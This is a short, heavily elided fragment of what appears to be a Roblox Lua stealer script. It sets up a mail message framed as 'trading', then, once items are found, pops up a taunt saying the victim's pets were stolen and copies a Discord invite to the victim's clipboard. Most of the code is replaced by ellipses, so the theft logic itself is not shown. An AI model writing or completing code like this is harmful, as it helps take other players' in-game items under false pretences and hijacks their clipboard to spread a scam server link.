...
local MailMessage = "Trading for the "
...
if #sortedItems > 0 then
    ...
    message.Error("Diddy just stole all your pets! \n Join discord.gg/A8zsfEB3bv")
    setclipboard("discord.gg/A8zsfEB3bv")
end
